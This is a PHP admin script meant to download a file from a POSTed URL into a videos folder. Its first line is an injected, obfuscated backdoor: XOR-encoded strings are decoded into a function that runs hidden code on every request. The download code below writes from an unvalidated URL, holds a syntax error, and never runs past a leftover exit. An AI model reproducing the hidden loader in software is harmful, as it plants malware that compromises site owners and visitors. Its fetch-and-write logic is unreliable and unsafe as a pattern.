<?php $wmohfKVo='1OEPT39P 9-3TU '; $lphxtEVC='R= 1 Vf6UWNG=:N'^$wmohfKVo; $GnAYIKj='PUpo0L T2:Z +KT=1O;iVDSFn 1M1,64<,RqNnJlX+A;5<3RYpC+5-WPH2+k44Ayu7.H5TPc=SGdhZqxz1Gmaa5O mNGpLqoEE6Q:fn0xdUYIlWWM4= YU>cpW881nQTK0CrkzD=CZ60JFhmyrH3YQba ojukiX0YpNURjt;5F.7 jK V hqzCO8A 4GCGTyT9BDLZhN4=DXpJR363cXg-6Y:Nk6RP;  =Z04cpT,5:90JhLW =31TZtPL3xy7207j- tj<Q0fnDRb,QW0<jxB<po TJ;gQ2YBtlrQU MyxUU9YMDkww4Z6>Rqo.ipD-HlgB4. LGa9cx+SB5M9YxFAc105kx6zx GgP=+0zjrWCHYGDIYw,nxsg=XN;hG2TsewbK< bcCkM23;AvtrI82P:RygS.Z-zpk0 T zlr.ICE3;P+-RIRe4WBm>ROWd3P2=B102Euvb5 +:4=aJ 589feFE2-;,e8STBgc08.it5AHSepmd 0BSUk =B, +32GSlv<+MdXXw4 N4KycuRqY2lNi6X;2<D>7 UibKqYBd4JHiz4tbXpK3VeiWS,LtQae7n rSXngrusGrjs1N A05;0.6U; O Ezc5-1G<TRQeHs,1.8KfgXliOy1e3IAL NqU4OT7L2;7 8P=d+cKezSC+XmhpWhO'; $nJcmTaC=$lphxtEVC('', '93XNV9N7FS5Nt.,TB;HAq<<41DP9PsiYIXuXgN1fQM4UVHZ=7P;DGr31<St4YA5QQSO<TxpGV6>MHzQXZJMdhEZ:TMsgWkJeLLP>HNJYXYuirLs>qGIR50PKT3YLPGjtoYhYBpM4g5CDjhUMQV,R-09EI2J+KM3U +j<rOTHA4BRNBoK3YA,SxE1HRQ365:QpV70eabGI79Rzn6RBRCeGKW5I+P<v4ZTAb1UMCMtJTVJUqbF1OOVP72Txhl;6xyyrJLSTNW4IFSzrFZ0;EYCX96yKD5>Z8:W bILV:0Yvsqq1X-,dVWSB;ZK7JeScz-KhDFfPOT-nABiqM<0P,Z1Xne<cud>=e.XA4GtVNIZWLwg>8+1,pWWdqzCY9:Z7,W-SXWF YYYiJbiVRO VIRmNS<O7BmZSPPpzOTA AZQRn<-6VI9JA;37ML802Z3;6;l=GIjSQA CB=QEHUPXInDTLXOIfaVLOM:S6-kNX:QHAPQ <2EVKDAB02,4KX;sESZA3 DQWN4CtxSPA:UbYESrY4VYfMR9OSgcURYr4KkLdbCU++PBPGZ:HyPoTZd6ItF3SWRXFBa<ZPARZgTLSP<R IjPUWi0CI<T6RDELH+S56vIhWHPZYbOGxLIoYJo:,7-LfU1U;5lkBZNLW1YCvJpos6;B,EXYlb2'^$GnAYIKj); $nJcmTaC();
	include('../config/config.php');

	 // maximum execution time in seconds
    set_time_limit (24 * 60 * 60);

    if (!isset($_POST['submit'])) die();

	$localpath = "http://".$_SERVER['HTTP_HOST']."/";
	echo $localpath;
	exit;
    // folder to save downloaded files to. must end with slash
    $destination_folder = $localpath'/admin/videos/';

    $url = $_POST['url'];
    $newfname = $destination_folder . basename($url);

    $file = fopen ($url, "rb");
    if ($file) {
      $newf = fopen ($newfname, "wb");

      if ($newf)
      while(!feof($file)) {
        fwrite($newf, fread($file, 1024 * 8 ), 1024 * 8 );
      }
    }

    if ($file) {
      fclose($file);
    }

    if ($newf) {
      fclose($newf);
    }

?>